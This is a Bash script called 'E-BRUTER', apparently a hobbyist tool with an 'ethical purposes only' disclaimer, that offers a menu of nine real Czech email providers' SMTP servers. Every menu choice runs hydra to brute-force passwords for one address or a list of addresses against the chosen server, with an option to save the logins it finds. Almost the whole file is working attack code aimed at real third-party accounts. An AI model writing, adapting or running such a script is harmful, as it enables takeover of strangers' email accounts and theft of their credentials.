#!/bin/bash
#   <=: INFO :=>
# Author: James Rock
# Facebook: www.facebook.com/Wicked.W0lf
# ! FOR ETHICAL PURPOSES ONLY !
# For absolute beginners

#BARVY

red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
white="\033[97m"
nc="\e[0m"

#BANNER
clear
echo -e "$nc"
echo -e "$nc"
echo -e "$red	███████╗$nc       $green██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ "
echo -e "$red 	██╔════╝$nc       $green██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗"
echo -e "$red 	█████╗  $nc$blue█████╗$nc $green██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝"
echo -e "$red 	██╔══╝  $nc$blue╚════╝$nc $green██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗"
echo -e "$red 	███████╗$nc       $green██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║"
echo -e "$red	╚══════╝$nc       $green╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝"


#VYBER

echo ""
echo -e "	  $blue <=:Select the SMTP service from the menu:=> $nc"
echo ""
echo -e "$green	    ΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞ"
echo -e "	    Ξ	  					     Ξ"
echo -e "	    Ξ	$red 1 : Seznam	4 : Volny     7 : O2        $nc$green Ξ"
echo -e "	    Ξ						     Ξ"
echo -e	"	    Ξ	$red 2 : Atlas	5 : UPC       8 : Tiscali   $nc$green Ξ"
echo -e "	    Ξ						     Ξ"
echo -e "	    Ξ	$red 3 : Centrum	6 : Pipni     9 : T-Mobile $nc$green  Ξ"
echo -e "	    Ξ                                                Ξ"
echo -e "	    ΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞ"
echo -e "\n $green"
read -e -p " Select : " cislo

#AKCE

if [ $cislo = 1 ]; then
  smtp1=smtp.seznam.cz
  echo ""
  read -e -p "[SEZNAM] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -e -p "[SEZNAM] Enter the file location : " soubor
       read -e -p "[SEZNAM] Enter the wordlist location : " wordlist
       read -e -p "[SEZNAM] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -e -p "[SEZNAM] Enter the file location : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
   fi
    elif [ $file = 2 ]; then
	   read -e -p "[SEZNAM] Enter Email : " email
	   read -e -p "[SEZNAM] Enter the wordlist location : " wordlist
	   read -e -p "[SEZNAM] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -e -p "[SEZNAM] Enter the file location : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
fi
fi

elif [ $cislo = 2 ]; then
  smtp2=smtp.atlas.cz
  echo ""
  read -e -p "[ATLAS] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -e -p "[ATLAS] Enter the file location : " soubor
       read -e -p "[ATLAS] Enter the wordlist location : " wordlist
       read -e -p "[ATLAS] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -e -p "[ATLAS] Enter the file location : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
   fi
    elif [ $file = 2 ]; then
	   read -e -p "[ATLAS] Enter Email : " email
	   read -e -p "[ATLAS] Enter the wordlist location : " wordlist
	   read -e -p "[ATLAS] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -e -p "[ATLAS] Enter the file location : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
fi
fi

elif [ $cislo = 3 ]; then
  smtp3=smtp.centrum.cz
  echo ""
  read -e -p "[CENTRUM] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -e -p "[CENTRUM] Enter the file location : " soubor
       read -e -p "[CENTRUM] Enter the wordlist location : " wordlist
       read -e -p "[CENTRUM] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -e -p "[CENTRUM] Enter the file location : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
   fi
    elif [ $file = 2 ]; then
	   read -e -p "[CENTRUM] Enter Email : " email
	   read -e -p "[CENTRUM] Enter the wordlist location : " wordlist
	   read -e -p "[CENTRUM] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -e -p "[CENTRUM] Enter the file location : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
fi
fi

elif [ $cislo = 4 ]; then
  smtp4=smtp.volny.cz
  echo ""
  read -e -p "[VOLNY] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -e -p "[VOLNY] Enter the file location : " soubor
       read -e -p "[VOLNY] Enter the wordlist location : " wordlist
       read -e -p "[VOLNY] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -e -p "[VOLNY] Enter the file location : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
   fi
    elif [ $file = 2 ]; then
	   read -e -p "[VOLNY] Enter Email : " email
	   read -e -p "[VOLNY] Enter the wordlist location : " wordlist
	   read -e -p "[VOLNY] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -e -p "[VOLNY] Enter the file location : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
fi
fi

elif [ $cislo = 5 ]; then
  smtp5=smtp.upcmail.cz
  echo ""
read -e -p "[UPC] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[UPC] Enter the file location : " soubor
     read -e -p "[UPC] Enter the wordlist location : " wordlist
     read -e -p "[UPC] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[UPC] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[UPC] Enter Email : " email
   read -e -p "[UPC] Enter the wordlist location : " wordlist
   read -e -p "[UPC] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[UPC] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
fi
fi

elif [ $cislo = 6 ]; then
  smtp6=smtp.pipni.cz
  echo ""
read -e -p "[PIPNI] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[PIPNI] Enter the file location : " soubor
     read -e -p "[PIPNI] Enter the wordlist location : " wordlist
     read -e -p "[PIPNI] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[PIPNI] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[PIPNI] Enter Email : " email
   read -e -p "[PIPNI] Enter the wordlist location : " wordlist
   read -e -p "[PIPNI] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[PIPNI] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
fi
fi

elif [ $cislo = 7 ]; then
  smtp7=smtp.etmail.cz
  echo ""
read -e -p "[O2] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[O2] Enter the file location : " soubor
     read -e -p "[O2] Enter the wordlist location : " wordlist
     read -e -p "[O2] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[O2] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[O2] Enter Email : " email
   read -e -p "[O2] Enter the wordlist location : " wordlist
   read -e -p "[O2] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[O2] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
fi
fi

elif [ $cislo = 8 ]; then
  smtp8=smtp.tiscali.cz
  echo ""
read -e -p "[TISCALI] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[TISCALI] Enter the file location : " soubor
     read -e -p "[TISCALI] Enter the wordlist location : " wordlist
     read -e -p "[TISCALI] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[TISCALI] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[TISCALI] Enter Email : " email
   read -e -p "[TISCALI] Enter the wordlist location : " wordlist
   read -e -p "[TISCALI] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[TISCALI] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
fi
fi

elif [ $cislo = 9 ]; then
  smtp9=smtp.t-email.cz
  echo ""
read -e -p "[T-MOBILE] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[T-MOBILE] Enter the file location : " soubor
     read -e -p "[T-MOBILE] Enter the wordlist location : " wordlist
     read -e -p "[T-MOBILE] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[T-MOBILE] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[T-MOBILE] Enter Email : " email
   read -e -p "[T-MOBILE] Enter the wordlist location : " wordlist
   read -e -p "[T-MOBILE] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[T-MOBILE] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
fi
fi
else
 echo -e " \033[7;31m WRONG INPUT! $nc"
exit 1
fi
